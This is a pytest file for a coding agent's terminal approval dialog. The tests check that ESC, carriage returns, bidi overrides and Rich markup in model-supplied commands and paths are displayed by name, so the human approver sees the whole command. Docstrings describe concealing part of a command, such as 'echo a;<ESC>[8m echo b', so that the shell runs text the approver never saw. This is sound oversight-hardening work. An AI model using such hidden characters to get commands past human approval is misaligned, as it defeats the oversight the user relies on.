    from prompt_toolkit.formatted_text import ANSI, to_formatted_text

    req = ApprovalRequest("write", {}, "write", yes_label="Yes", redirect_label=f"Only (x{char}y)")
    row = build_options_view(0, rows_for(req))[2]
    named = [text for style, text in to_formatted_text(ANSI(row)) if "reverse" in style]
    assert "".join(named) == name
    typed = ApprovalRequest("write", {}, "write", yes_label="Yes", redirect_label=f"Only (x{name}y)")
    assert not [
        text
        for style, text in to_formatted_text(ANSI(build_options_view(0, rows_for(typed))[2]))
        if "reverse" in style
    ]


def test_a_line_break_in_an_option_label_stays_on_the_one_row() -> None:
    """Review round 4 (a surviving mutant: a label shown as a body, without
    ``one_row``). Each option is one row - the modal sizes them so - so a
    newline or a tab in the #161 redirect label is named in reverse video,
    never obeyed: ``x\\ny`` would otherwise push the rest of the label onto a
    row the dialog does not count."""

    from aelix_coding_agent.tui.approval_dialog import rows_for

    req = ApprovalRequest("write", {}, "write", yes_label="Yes", redirect_label="Only (x\ny\tz)")
    view = build_options_view(0, rows_for(req))
    assert len(view) == 5 and not any("\n" in row or "\t" in row for row in view)
    assert _reverse_runs(view[2]) == ["^J", "^I"]
    assert _plain([view[2]]) == "  3. [p] Only (x^Jy^Iz)"


def _reverse_runs(line: str) -> list[str]:
    """Each stretch of *line* drawn in reverse video, as prompt-toolkit parses it."""

    from prompt_toolkit.formatted_text import ANSI, to_formatted_text

    runs: list[str] = []
    inside = False
    for style, text in to_formatted_text(ANSI(line)):
        if "reverse" not in style:
            inside = False
        elif inside:
            runs[-1] += text
        else:
            runs.append(text)
            inside = True
    return runs


_DIFF_EDIT = {"path": "e.txt", "edits": [{"oldText": "o\x1bo", "newText": "n\u202en"}]}


@pytest.mark.parametrize(
    ("req", "rows"),
    [
        (
            ApprovalRequest("write", {"path": "w.txt", "content": "a\x1bb\nc\u202ed\n"}, "write"),
            {"+a^[b": ["^["], "+c<U+202E>d": ["<U+202E>"]},
        ),
        (
            ApprovalRequest("edit", _DIFF_EDIT, "edit"),
            {"-o^[o": ["^["], "+n<U+202E>n": ["<U+202E>"]},
        ),
    ],
    ids=["write", "edit"],
)
def test_a_name_in_a_write_or_edit_diff_is_drawn_in_reverse_video(
    req: ApprovalRequest, rows: dict[str, list[str]]
) -> None:
    """Review round 4 (a surviving mutant: the diff rows ``render_diff``
    returns lost their reverse video and every row stayed green). The file
    body is where a model would hide an ESC; its name must not read like the
    letters ``^[`` typed into the file."""

    view = build_approval_view(req)
    for text, runs in rows.items():
        (line,) = [line for line in view if text in _plain([line])]
        assert _reverse_runs(line) == runs, text


_EDIT_P = {"path": "p\x1b.txt", "edits": [{"oldText": "a", "newText": "b"}]}


@pytest.mark.parametrize(
    ("req", "title", "head"),
    [
        (
            ApprovalRequest("write", {"path": "p\x1b.txt", "content": "x"}, "write"),
            "Create/overwrite p^[.txt?",
            "Create/overwrite p^[.txt",
        ),
        (ApprovalRequest("edit", _EDIT_P, "edit"), "Edit p^[.txt?", "Edit p^[.txt"),
        (ApprovalRequest("t\x1bx", {"a": 1}, "other"), "Allow t^[x?", "Tool: t^[x"),
        (
            ApprovalRequest("write", {"path": "@p\x1b.txt", "content": "x"}, "write"),
            "Create/overwrite @p^[.txt?",
            "The tool writes to: p^[.txt",
        ),
    ],
    ids=["write", "edit", "other", "expanded-path"],
)
def test_a_name_in_the_title_and_the_head_row_is_drawn_in_reverse_video(
    req: ApprovalRequest, title: str, head: str
) -> None:
    """Review round 4 (two surviving mutants: the Panel title, and the
    ``Create/overwrite``/``Edit`` head row, drawn as plain ``Text``). The path
    the write lands on is named in both places, and both must say so."""

    view = build_approval_view(req)
    assert title in _plain([view[0]]) and _reverse_runs(view[0]) == ["^["]
    (line,) = [line for line in view[1:] if _plain([line]).strip("│ ").startswith(head)]
    assert _reverse_runs(line) == ["^["]


# --- the footer short form -------------------------------------------------


@pytest.mark.parametrize("width", [9, 20, 40, 45, 60])
async def test_yes_held_is_never_the_part_the_footer_cuts(width: int) -> None:
    """Round 1's short form ended in "Yes held" and was drawn ``… Ye…`` at 40
    columns. It now starts with it: whole at 9 columns or more."""

    async with _Open({}, width=width, request=_write_long()) as dialog:
        footer = _footer(dialog.paint(width, 18))
        assert footer.startswith("Yes held"), footer


async def test_the_full_footer_sentence_is_kept_where_it_fits() -> None:
    async with _Open({}, width=120, request=_write_long()) as dialog:
        footer = _footer(dialog.paint(120, 34))
        assert re.match(r"\d+ of \d+ lines hidden \(↑0 ↓\d+\) · PgUp/PgDn to scroll · Yes held until all seen", footer)


async def test_a_121_line_write_shows_its_tail_after_9_page_downs_at_80x24() -> None:
    """The commit's number, as the live run counts it (PgDn until the tail is on
    screen). At #188's five-line step the same count was 23, not 25."""

    # The live 80x24 footer read "112/126 hidden": a 14-row body, so the modal
    # had 19 rows (14 + the footer + three options and their hint).
    async with _Open({}, request=_write_long()) as dialog:
        assert _footer(dialog.paint(80, 19)).startswith("Yes held · 112/126 hidden")
        presses = 0
        while _TAIL not in dialog.screens[-1]:
            dialog.press("pagedown")
            dialog.paint(80, 19)
            presses += 1
        assert presses == 9


# --- removed characters are named, not deleted -----------------------------


@pytest.mark.parametrize(
    ("char", "name"),
    [
        ("\x1b", "^["),
        ("\r", "^M"),
        ("\x0b", "^K"),
        ("\x7f", "^?"),
        ("\x9b", "<U+009B>"),
        ("\u202e", "<U+202E>"),
        ("\u2028", "<U+2028>"),
        ("\u200b", "<U+200B>"),
    ],
)
def test_each_removed_character_is_drawn_as_its_name(char: str, name: str) -> None:
    """``safe_for_terminal`` DELETED these, so ``echo a;<ESC>[8m echo b`` was
    shown as ``echo a;[8m echo b`` while the shell ran the ESC."""

    from prompt_toolkit.formatted_text import ANSI, to_formatted_text

    command = f"echo a;{char}echo TAIL"
    view = build_approval_view(ApprovalRequest("bash", {"command": command}, "bash"))
    assert f"echo a;{name}echo TAIL" in _plain(view)
    named = [
        (style, text)
        for line in view
        for style, text in to_formatted_text(ANSI(line))
        if "reverse" in style
    ]
    assert "".join(text for _s, text in named) == name, "the name is drawn in reverse video"


def test_a_name_reads_differently_from_the_same_letters_typed() -> None:
    from prompt_toolkit.formatted_text import ANSI, to_formatted_text

    def styled(command: str) -> list[tuple[str, str]]:
        view = build_approval_view(ApprovalRequest("bash", {"command": command}, "bash"))
        return [f for line in view for f in to_formatted_text(ANSI(line))]

    assert styled("a\x1bb") != styled("a^[b")
    assert _plain(build_approval_view(ApprovalRequest("bash", {"command": "a\x1bb"}, "bash"))) == _plain(
        build_approval_view(ApprovalRequest("bash", {"command": "a^[b"}, "bash"))
    ), "same letters; only the reverse video tells them apart"


def test_a_cr_in_a_file_stays_on_its_line() -> None:
    plain = _plain_view(ApprovalRequest("write", {"path": "w.txt", "content": "one\r\ntwo\rthree\n"}, "write"))
    assert "+one^M" in plain and "+two^Mthree" in plain


def test_a_newline_in_a_path_is_named() -> None:
    plain = _plain_view(ApprovalRequest("write", {"path": "a\nb.txt", "content": "x"}, "write"))
    assert "a^Jb.txt" in plain


async def test_the_hold_counts_the_rows_the_names_take() -> None:
    """400 CRs are 800 cells once named: the body overflows and Yes waits.
    Deleted (round 1), the command was one short row and Yes ran it at once."""

    req = ApprovalRequest("bash", {"command": "echo a" + "\r" * 400 + f"; echo {_TAIL}"}, "bash")
    async with _Open({}, request=req) as dialog:
        first = dialog.paint(80, 10)
        assert _held(_footer(first)) and _TAIL not in first
        dialog.press("1")
        assert not dialog.answered


# --- model text is never Rich markup --------------------------------------


_MARKUP = ["[/]", "[bold]", "[/bold]", "[link=x]y[/link]", "[red"]


@pytest.mark.parametrize("tag", _MARKUP)
@pytest.mark.parametrize("kind", ["write", "edit", "other"])
def test_markup_in_a_path_or_tool_name_is_shown_as_typed(tag: str, kind: str) -> None:
    """A ``str`` Panel title is parsed as markup: ``[/]`` raised MarkupError
    and the fallback drew ``<rich.console.Group object at 0x…>`` — one row, so
    nothing was held and ``1`` answered (402a8013 and 1c8eb79a)."""

    args = {"path": f"{tag}.txt", "content": _TAIL, "edits": [{"oldText": "o", "newText": _TAIL}]}
    tool = tag if kind == "other" else kind
    view = build_approval_view(ApprovalRequest(tool, args, kind))
    assert view[0].startswith("╭") and f"{tag}" in view[0], "the Panel itself rendered"
    plain = _plain(view)
    assert "rich.console" not in plain
    assert tag in plain
    assert _TAIL in plain


async def test_markup_cannot_shrink_the_body_below_the_hold() -> None:
    content = "".join(f"filler {i:03d}\n" for i in range(60)) + _TAIL
    req = ApprovalRequest("write", {"path": "[/].txt", "content": content}, "write")
    async with _Open({}, request=req) as dialog:
        first = dialog.paint(80, 18)
        assert _held(_footer(first))
        dialog.press("1")
        assert not dialog.answered


def test_if_the_panel_cannot_render_the_rows_are_still_all_there(monkeypatch: pytest.MonkeyPatch) -> None:
    import rich.panel

    def boom(*_a: Any, **_k: Any) -> Any:
        raise RuntimeError("no panel")

    monkeypatch.setattr(rich.panel, "Panel", boom)
    view = build_approval_view(_write_long())
    assert "Group object" not in "\n".join(view)
    assert any(_TAIL in line for line in view)
    assert len(view) > 120


# --- the painter's width, not Rich's ----------------------------------------

_WIDE_DISAGREEING = {
    "regional-indicator": "\U0001f1e6",
    "skin-tone-modifier": "\U0001f3fb",
    "text-default-emoji+VS16": "\u263a\ufe0f",
}


@pytest.mark.parametrize("ch", list(_WIDE_DISAGREEING.values()), ids=list(_WIDE_DISAGREEING))
def test_no_display_row_is_wider_than_the_screen_by_any_count(ch: str) -> None:
    """Rich and prompt-toolkit (wcwidth, as pyte) disagree about these; each
    display row must fit by the larger count."""

    from aelix_coding_agent.tui.approval_dialog import _display_rows
    from aelix_coding_agent.tui.width import cells_at_most
    from prompt_toolkit.formatted_text import ANSI, fragment_list_to_text, to_formatted_text
    from prompt_toolkit.utils import get_cwidth
    from rich.cells import cell_len

    command = f"echo {ch * 30} ; echo {_TAIL} >> out.txt"
    view = build_approval_view(ApprovalRequest("bash", {"command": command}, "bash"), width=80)
    rows = _display_rows(view, 80)
    texts = [
        fragment_list_to_text(to_formatted_text(ANSI(r)) if isinstance(r, str) else r) for r in rows
    ]
    for text in texts:
        assert cells_at_most(text) <= 80
        assert get_cwidth(text) <= 80 and cell_len(text) <= 80, text
    assert any(_TAIL in text for text in texts), "a word is not split across rows"


@pytest.mark.parametrize("ch", list(_WIDE_DISAGREEING.values()), ids=list(_WIDE_DISAGREEING))
async def test_yes_waits_for_the_painted_tail_when_widths_disagree(ch: str) -> None:
    """Round 1 counted 4 lines for this command (no hold) while the painted row
    ran past the border and ended at ``echo TAIL_``. Paint only the first rows:
    Yes must wait until the screen has had the tail whole."""

    req = ApprovalRequest("bash", {"command": f"echo {ch * 30} ; echo {_TAIL} >> out.txt"}, "bash")
    async with _Open({}, request=req) as dialog:
        first = dialog.paint(80, 9)  # five option rows + footer leave the body 3
        dialog.press("1")
        if dialog.answered:
            raise AssertionError(f"Yes taken on a screen that was:\n{first}")
        for _ in range(10):
            if not _held(_footer(dialog.screens[-1])):
                break
            dialog.press("pagedown")
            dialog.paint(80, 9)
        assert any(_TAIL in s for s in dialog.screens)
        dialog.press("1")
        assert await dialog.answer() is ApprovalDecision.YES


@pytest.mark.parametrize("ch", list(_WIDE_DISAGREEING.values()), ids=list(_WIDE_DISAGREEING))
async def test_the_tail_reaches_a_vt100_screen_when_widths_disagree(ch: str) -> None:
    """The whole chrome through a real VT100 output into ``pyte`` (wcwidth)."""

    from _pyte import render_chrome_to_screen  # sibling helper (pytest prepend import mode)
    from aelix_coding_agent.tui.overlay import show_modal

    req = ApprovalRequest("bash", {"command": f"echo {ch * 30} ; echo {_TAIL} >> out.txt"}, "bash")

    def build_state(chrome: Any) -> None:
        asyncio.ensure_future(
            run_approval_dialog(request=req, show_modal=show_modal, chrome=chrome, width=80)
        )

    display = await render_chrome_to_screen(rows=40, cols=80, build_state=build_state)
    assert _TAIL in "\n".join(display)


# --- review round 3: a cut row never ends one cell past the edge -------------


def _cut_texts(text: str, width: int) -> list[str]:
    from aelix_coding_agent.tui.approval_dialog import _cut

    return ["".join(f[1] for f in row) for row in _cut([("", ch) for ch in text], width)]


@pytest.mark.parametrize("width", [10, 40, 80])
def test_a_row_opened_by_a_carried_space_still_fits(width: int) -> None:
    """The last split left a space to open the next row; that row filled to
    *width* and a two-cell character followed. Round 2 split once, after the
    space, and kept ``width - 1`` letters plus the two-cell character: a row
    of ``width + 1`` cells, whose last cell a real terminal may wrap onto the
    next row (the verifier measured rows of 80, 1 and 81 cells)."""

    from aelix_coding_agent.tui.width import cells_at_most

    text = "a" * (width - 1) + "  " + "b" * (width - 1) + "\uac00" + "TAIL"
    rows = _cut_texts(text, width)
    assert all(cells_at_most(row) <= width for row in rows), [cells_at_most(r) for r in rows]
    assert "".join(rows) == text, "every character is kept, in order"


def test_the_dialog_reaches_the_carried_space_case_and_fits() -> None:
    """The same shape through the dialog: skin-tone modifiers are no cells to
    Rich, so it keeps the command on one Panel line and :func:`_cut` gets it."""

    from aelix_coding_agent.tui.approval_dialog import _display_rows
    from aelix_coding_agent.tui.width import cells_at_most
    from prompt_toolkit.formatted_text import ANSI, fragment_list_to_text, to_formatted_text

    tone = "\U0001f3fb"
    command = tone * 30 + "a" * 17 + "  " + tone * 30 + "b" * 19 + "\uac00TAILX ; echo"
    view = build_approval_view(ApprovalRequest("bash", {"command": command}, "bash"), width=80)
    texts = [
        fragment_list_to_text(to_formatted_text(ANSI(r)) if isinstance(r, str) else r)
        for r in _display_rows(view, 80)
    ]
    assert max(cells_at_most(t) for t in texts) <= 80, [cells_at_most(t) for t in texts]
    assert "b" * 19 + "\uac00" in "".join(texts)


def test_cut_rows_fit_and_keep_every_character_for_mixed_widths() -> None:
    """A seeded sweep over one- and two-cell characters and spaces.

    #399 review round 3: rows are cut between grapheme clusters, never inside
    one (``e`` + U+0301 kept its accent on the next row), and a cluster is
    measured whole: the mark on a letter is no cell of its own, so a row is
    measured by ``cells_by_cluster`` (which also keeps a final mark off the
    last column) and by prompt-toolkit's own count, not by ``cells_at_most``.
    The one split allowed inside a cluster is of a cluster wider than a row
    (a run of skin-tone modifiers on one letter)."""

    import random

    from aelix_coding_agent.tui.width import cells_by_cluster, cluster_cells, graphemes
    from prompt_toolkit.utils import get_cwidth

    rng = random.Random(389)
    alphabet = ["a", " ", "\uac00", "\U0001f3fb", "\U0001f1e6", "e\u0301"]
    for _ in range(400):
        width = rng.randint(2, 30)
        text = "".join(rng.choice(alphabet) for _ in range(rng.randint(0, 90)))
        rows = _cut_texts(text, width)
        assert "".join(rows) == text
        assert all(cells_by_cluster(row) <= width for row in rows), (width, text)
        assert all(get_cwidth(row) <= width for row in rows), (width, text)
        bounds, at = set(), 0
        for cluster in graphemes(text):
            at += len(cluster)
            bounds.add(at)
            if cluster_cells(cluster, ends_row=True) > width:
                bounds.update(range(at - len(cluster), at))
        at = 0
        for row in rows[:-1]:
            at += len(row)
            assert at in bounds, (width, text, rows)



def test_a_combining_mark_stays_on_its_letter_s_row() -> None:
    """#399 review round 3 (Codex on the select title, the same ``_cut``): cut
    by code point, a letter on the last column kept its row and its accent
    went to the next, so the body drew ``e`` and a bare U+0301. The cluster
    moves whole."""

    from aelix_coding_agent.tui.approval_dialog import _display_rows

    accented = "e\u0301"
    line = "│" + "a" * 78 + accented + "bbb│"
    rows = _display_rows([line], 80)
    texts = ["".join(f[1] for f in r) if not isinstance(r, str) else r for r in rows]
    assert "".join(texts) == line
    assert sum(t.count(accented) for t in texts) == 1, texts
    assert not any(t.startswith("\u0301") for t in texts)


def test_a_line_one_cell_too_wide_is_still_cut() -> None:
    """One regional indicator is one cell to Rich and two to the painter, so a
    Panel line Rich filled to the edge is one cell over. Keeping it whole
    would lose its last cell at the border (a surviving round-2 mutant
    tolerated exactly that one cell)."""

    from aelix_coding_agent.tui.approval_dialog import _display_rows
    from aelix_coding_agent.tui.width import cells_at_most

    line = "│ " + "a" * 76 + "\U0001f1e6" + "│"
    assert cells_at_most(line) == 81
    rows = _display_rows([line], 80)
    texts = ["".join(f[1] for f in r) if not isinstance(r, str) else r for r in rows]
    assert all(cells_at_most(t) <= 80 for t in texts), [cells_at_most(t) for t in texts]
    assert "".join(texts) == line


def test_only_the_padding_needed_is_given_back() -> None:
    """A line one cell over with spare padding loses one space and keeps its
    margin before the border: the row is exactly the screen width."""

    from aelix_coding_agent.tui.approval_dialog import _display_rows
    from aelix_coding_agent.tui.width import cells_at_most

    line = "│ " + "a" * 70 + "\U0001f1e6" + " " * 6 + "│"
    assert cells_at_most(line) == 81
    rows = _display_rows([line], 80)
    assert len(rows) == 1
    text = "".join(f[1] for f in rows[0])
    assert cells_at_most(text) == 80
    assert text.endswith("\U0001f1e6" + " " * 5 + "│")
